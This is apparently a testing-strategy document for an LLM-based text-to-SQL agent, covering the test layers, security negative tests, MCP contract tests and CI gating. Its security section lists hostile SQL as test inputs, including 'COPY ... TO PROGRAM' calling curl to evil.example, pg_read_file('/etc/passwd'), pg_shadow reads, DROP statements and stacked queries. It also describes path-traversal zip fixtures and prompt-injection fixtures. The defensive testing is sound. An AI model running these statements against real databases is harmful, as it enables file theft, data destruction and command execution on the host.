# Testing

> **Status: philosophy and the security test suite are decided now** (the negative tests gate Stage 1). Coverage numbers and load results are **TBD — Stage 6**.

---

## 1. Philosophy

Three claims this project makes, in descending order of how badly a false claim would reflect:

1. **The blast radius is bounded.** ← must be *proven*, not asserted
2. Validation catches invalid SQL before execution.
3. The agent recovers from errors.

Testing effort follows that ordering. Claim 1 gets **negative tests that must fail** — the read-only role must be *unable* to write. A green test suite that never tried to write proves nothing.

**Non-determinism is handled by testing the harness, not the model.** LLM output cannot be asserted on directly. So: the agent's *plumbing* (does an error reach the retry loop? is the retry budget enforced? is the row limit clamped?) is tested deterministically with a fake LLM, and model *quality* is measured by the eval harness in [../ml/EVALUATION.md](../ml/EVALUATION.md). Conflating the two produces a flaky test suite and an unmeasured model.

## 2. Test pyramid

| Layer | Count | Speed | Dependencies |
|---|---|---|---|
| Unit | Most | ms | None — fakes throughout |
| Integration | Some | seconds | Real Postgres via testcontainers |
| **Security (negative)** | **Small, non-negotiable** | seconds | Real Postgres |
| Contract (MCP) | Small | seconds | Real MCP servers |
| End-to-end | Few | tens of seconds | Everything, fake LLM |
| Load | Few | minutes | Everything |
| Eval | Separate | many minutes | Everything, **real LLM** |

Eval is deliberately outside the test suite — it costs money, it is non-deterministic, and it produces measurements rather than pass/fail. It runs on demand and per release, not per commit.

**The eval *harness*, however, is ordinary code and is tested like it.** The machinery that decides what a number means — result comparison, Recall@k, the failure taxonomy, resumption — has no model and no database anywhere near it, which is the point of the injected answerer seam. That logic has to be trustworthy *before* tokens are spent producing numbers with it, because a wrong comparison produces a plausible score rather than a failure.

## 3. Unit tests

Fast, isolated, no I/O. The bulk of the suite.

High-value targets:

- **sqlglot AST validation** — every rejection path: multiple statements, DML nodes, DDL nodes, unknown identifiers, `SELECT` nested inside a CTE that is not read-only.
- **Row-limit injection** — no existing `LIMIT`; larger existing `LIMIT`; smaller existing `LIMIT` (the smaller must win); `LIMIT` inside a subquery.
- **Error classification** — each database error maps to the right `error_type`, since the retry prompt branches on it.
- **Retry budget** — exhaustion raises rather than looping.
- **Settings validation** — out-of-range values fail at startup, client values clamp to ceilings.
- **Prompt assembly** — stable prefix is byte-identical across requests (the prompt-cache precondition).
- **Result comparison** — every rule in [../ml/EVALUATION.md](../ml/EVALUATION.md) §1.1, one test each, written as an executable copy of that table. This is the highest-value unit test in the project: a bug in `compare` does not raise, it returns a *number*, and the number looks exactly like a correct one.
- **Eval resumption** — a finished question is not asked again, the summary covers the whole run rather than the last invocation, and a resume with a different model or commit is refused.
- **Profiling bounds** — identifier resolution happens *before* any statement is composed (asserted with a connection that raises on any access, so the ordering is tested rather than the outcome); type eligibility for extremes; sample-size clamping.

The LLM is a fake that returns scripted responses, so retry, decomposition, and self-correction logic is fully testable without a live model.

## 4. Integration tests

Real PostgreSQL via `testcontainers`, with pgvector.

**Not SQLite, not a mock.** The security model *is* Postgres role enforcement; testing it against anything else tests nothing. The container is created per session, and per-test isolation comes from transaction rollback.

Covers: migrations up and down; role and grant creation; vector round-trip and ANN retrieval; statement timeout actually firing; connection pool exhaustion behaviour; audit-log writes; and profiling behaviour that has no useful fake — what `count(DISTINCT)` does to a `json` column, what `reltuples` reports before an `ANALYZE`, and whether a statement composed from a catalog name actually runs.

## 5. Security tests — the ones that must fail

**These gate every release.** Each asserts the read-only role is *denied*. A test here that passes when it should fail means the containment story is broken.

```python
@pytest.mark.parametrize(
    "statement",
    [
        "INSERT INTO orders (id) VALUES (1)",
        "UPDATE orders SET total_amount = 0",
        "DELETE FROM orders",
        "TRUNCATE orders",
        "CREATE TABLE evil (id int)",
        "DROP TABLE orders",
        "ALTER TABLE orders ADD COLUMN x int",
        "CREATE INDEX ON orders (id)",
        "COPY orders TO PROGRAM 'curl evil.example'",
        "SELECT pg_read_file('/etc/passwd')",
        "SELECT pg_ls_dir('/')",
        "SELECT * FROM agent_meta.query_audit",
        "SELECT * FROM agent_meta.sessions",
        "SELECT * FROM pg_shadow",
    ],
)
def test_readonly_role_is_denied(ro_connection, statement):
    with pytest.raises(psycopg.errors.InsufficientPrivilege):
        ro_connection.execute(statement)
```

The two easiest to omit and most damaging to miss:

- **`pg_read_file` / `COPY ... TO PROGRAM`** — without `EXECUTE` revoked on functions, a `SELECT`-only role can read files off the database host. Blocking DML while leaving these reachable is not a read-only role.
- **`agent_meta` reads** — generated SQL must not be able to read the audit log, session history, or embeddings.

Additional cases:
- Every AST rejection path is re-tested end-to-end through `execute_sql` — it must reject independently, not rely on the caller having validated first.
- Stacked queries (`SELECT 1; DROP TABLE x`).
- Prompt-injection fixtures: sampled values and column comments containing instruction-shaped text. The assertion is not "the model ignored it" (unassertable) but "whatever SQL results is still `SELECT`-only, still row-limited, still runs under the read-only role."

**Disclosure tests** are the other half of the negative suite, and they invert the question: the role tests assert the database *refuses*, these assert the system *withholds*. Two files carry them.

- **What may reach a prompt.** A planted secret in a catalog element's serialized text is absent from the rendered prompt, plus an assertion that the *whole* serialized string is absent — so a value the test never considered is excluded with it — and an allowlist assertion writing out exactly what the model receives, line by line. Deliberately brittle: that assertion *is* the network boundary, and changing what crosses it should require editing a list.
- **What a profile may reveal.** A sensitively-named column yields nothing even with sampling on; a value occurring once is withheld while a common one is not; a caller cannot request raw samples into existence. One test turns sampling *on* and asserts values do appear — without it, every negative test above would also pass if the feature were simply broken.

**Archive tests** are the newest kind, and the only ones whose subject is the filesystem rather than the database. Each builds a hostile zip — a member named `../../escaped.txt`, a backslash-separated traversal, a Windows drive letter, a symlink pointing at `/etc`, a member that expands past its budget — and asserts the loader refuses it. Each also asserts the file is genuinely **not on disk** afterwards, because a refusal that happened to write somewhere harmless is not evidence of a control. One positive test sits among them, checking that an ordinary nested path still extracts: it is what caught a symlink check that rejected every archive `ZipFile.writestr` produces, since those record permission bits with no file-type field at all.

Two lessons from the archive tests are worth stating separately, because both are about the suite rather than the code.

- **Test the intersection, not just each case.** When extraction gained a second verdict — skip an unrepresentable name, refuse an escaping one — a member that is *both* (`..` ends in a dot, which Windows cannot store) took the new path and was skipped instead of refused. Neither existing suite covered the overlap; the traversal suite went red only because the escape check had moved wholesale. There is now a test for the intersection specifically.
- **Assert the premise, not only the mitigation.** `tests/security/test_dsn_handling.py` asserts that psycopg really does quote the connection string in a parse error, alongside asserting that the redaction removes it. Without the first, a driver change that stopped leaking would leave a redaction nobody could tell was still necessary — and a redaction whose necessity is unproven is indistinguishable from one that has quietly stopped working.
- **A test whose premise turns out to be wrong is a finding, not a rename.** An integration test asserted that `LIKE` case sensitivity was "a genuine engine difference the verifier catches". It was not an engine difference at all — it was a transpilation gap, and fixing it made the test fail by returning the *right* answer. The test now uses a difference no transpilation can close (a mixed-storage column forced to `text`), and the old comment is preserved in the new one, because the mistake it records is the same one that misfiled 213 questions against the conversion.
- **Assert what a third-party parser actually does, not what it should.** Two rules in the verifier depend on sqlglot's representation and both would be silently wrong on a reasonable guess: `NOT LIKE` is a `Like` node with `negate=True` rather than a `Not` wrapping a `Like`, and `.name` on the `1 + 1` in `LIMIT 1 + 1` answers `'1'` because it returns the leftmost leaf. Each has a test naming the trap.

A third kind appears here and nowhere else: **source-level assertions**. That no identifier is interpolated into SQL, that raw values are read in exactly one function, that the sensitivity check precedes the statistics call. They check the shape of a module rather than its behaviour, which is unusual and deliberate — the property being protected is that someone changing the file can *see* what they are changing.

**Boundary tests** are the newest kind, and their adversary is different from every other file here: someone with nothing but the ability to send an HTTP request. Every other test in this suite assumes an attacker who already reached the machine.

- `tests/security/test_api_boundary.py` — the service is closed by default (loopback enforced, OpenAPI off, no CORS origin trusted); the probes reveal nothing (a fixed body for `/health`, two words per dependency for `/ready`); the error envelope publishes no exception text; and `X-Request-Id` is replaced rather than echoed. Every I/O boundary is faked through `create_app(resource_factory=...)`, deliberately — a security suite that needed Docker would be the first thing to get skipped.
- `tests/security/test_readonly_assertion.py` — `assert_read_only` against a real PostgreSQL, in **both directions**. It passes for the read-only role and *fails* for the owner connection, because a check that has only ever been run against a passing case is a check nobody has seen work.

Two more lessons, both about what a test holds fixed rather than what it asserts:

- **A control tested only against the fixture that satisfies it has been tested against itself.** The thirty role tests above are the example. All of them build `sql_agent_ro` from migration 002 in a testcontainer, and none looks at the role a deployment connects as — so they proved the migration was right and said nothing about production, for nineteen versions. The gap is closed by a startup assertion, not by another test ([ADR-033](../architecture/DECISIONS.md#adr-033--the-read-only-role-is-proved-at-startup-by-asking-rather-than-by-writing)). When a control has tests, the question is not *is it tested* but *what does the fixture hold fixed*.
- **A leak test must plant something identifiable and assert its absence in the whole response**, not check a field. The readiness test raises a probe error containing a password, an internal hostname and an IP, then asserts none of the three appear anywhere in `response.text` — because the failure being guarded against is a *new* path that renders the exception, and a field-level assertion cannot see one.

## 6. Contract tests (MCP)

Against real servers over the real transport — `python -m mcp_servers.<name>` launched as an actual subprocess, speaking actual JSON-RPC over stdio, against an actual Postgres. Nothing is mocked, because every interesting failure in an MCP integration lives in the parts a mock replaces: process launch, message framing, and whether stdout stayed clean.

- `tools/list` returns valid JSON Schema for every tool, and the schema the *client* receives is byte-identical to the one the server published.
- Every declared input constraint is enforced server-side — `maximum`, `enum`, `required`, `additionalProperties`. **Not just declared: enforced.** A schema constraint the server does not check is documentation, not a limit.
- Errors return `isError: true` with structured content, never a protocol-level exception — **and the session survives**. If a bad argument killed the session, one malformed call would end the conversation, and a model will produce malformed calls.
- Published ceilings equal the enforced ones. Asserted as `schema["maximum"] == MAX_K`, not against a literal, so the two cannot drift apart.
- Degradation: a server that fails to start is recorded and skipped, and the others still work.
- **Schema snapshot test** — tool schemas are captured and diffed, so a breaking change to a contract fails CI rather than silently shipping. It never regenerates itself: a test that writes its own expectation passes forever. See [../architecture/MCP.md](../architecture/MCP.md) §8.

**One structural constraint worth knowing before writing more of these.** The stdio transport is built on anyio task groups, whose cancel scopes must be exited by the task that entered them — and a pytest async *fixture* runs setup and teardown in different tasks. A `yield`-based registry fixture therefore passes every assertion and then raises at teardown. Each test opens its own registry inside the test body instead, naming only the servers it needs, which also keeps the subprocess count down.

## 7. End-to-end tests

> **`tests/e2e/` exists and is empty.** It is a real layer in `TEST_LAYERS` and marker-selectable, so the first file added to it is counted without anyone remembering to do anything. Nothing goes in it until `POST /v1/query` exists — the scenarios below all start with a request.

Full stack, fake LLM with scripted responses. Deterministic.

Scenarios: happy path; validation failure → correction → success; retry budget exhausted; statement timeout; row-limit truncation flagged in the response; multi-step decomposition; MCP server unavailable → documented degradation; client disconnects mid-SSE (no leaked connection or open transaction).

The HTTP tests that exist today are deliberately **not** here. `tests/unit/test_api_health.py` and `tests/security/test_api_boundary.py` drive the app through `TestClient` with every dependency faked, which makes them unit and security tests that happen to speak HTTP. An e2e test is one where the fakes stop at the LLM.

## 8. Load tests

> **TBD — Stage 6.** `locust`. Feeds [../operations/PERFORMANCE.md](../operations/PERFORMANCE.md) §4.

Answering: sustained throughput within p95 target; concurrency at pool saturation; behaviour past saturation (queueing vs collapse); memory per replica; effect of one expensive query on concurrent latency.

**Graceful degradation past saturation is the finding that matters**, more than peak throughput.

## 9. Benchmark tests

`pytest-benchmark` on components with explicit budgets — retrieval < 100 ms, validation < 50 ms.

These are **regression guards, not measurements**: they fail when a component gets meaningfully slower. Reported latency numbers come from the load tests on known hardware, not from a laptop running CI.

## 10. Coverage

Target: **85% on `src/`**, with 100% on validation, limit enforcement, and error classification.

Coverage is a floor, not a goal. The security suite would contribute a handful of percentage points and is worth more than the rest combined — which is the argument against optimizing the number. Uncovered branches are reviewed individually; a line that is genuinely untestable gets `# pragma: no cover` **with a comment saying why**.

## 11. CI

> **TBD — Stage 6.**

| Stage | Runs |
|---|---|
| Lint | `ruff format --check`, `ruff check`, `mypy src` |
| Unit | Full unit suite |
| Integration | testcontainers Postgres |
| **Security** | **The negative suite — a failure blocks merge** |
| Contract | MCP schema snapshots |
| E2E | Fake LLM |
| Smoke eval | ~20 questions, real LLM, **release only** |

**Each row above selects by marker, which is why markers cannot be optional.** An unmarked test is not skipped — it is *deselected*, so it runs in none of these rows and appears in no report. That drifted: thirteen files had no marker, two of them under `tests/security/`, and the security row was gating on **156 of 206** tests while reporting green.

Markers are therefore derived from the directory in `tests/conftest.py` rather than declared per module: `tests/security/` **is** the security layer, a hand-written marker can disagree with the path, and a derived one cannot. A test outside the known layers fails collection instead of vanishing. Layers overlap where they should — a security test needing a real database carries both `security` and `integration`, so it runs in both rows.

The general rule this is an instance of: **a selection mechanism needs a way to fail, or "nothing matched" and "everything passed" are the same output.**

## 12. What is not tested

Stated so the gap is deliberate rather than accidental:

- **LLM output quality.** Measured by the eval harness, not asserted in tests.
- **Prompt effectiveness.** Same — a prompt change is validated by an eval run.
- **Third-party library correctness.** sqlglot's parser is trusted; `EXPLAIN` is the second opinion.
- **Postgres itself.** The privilege system is the foundation, not a subject.
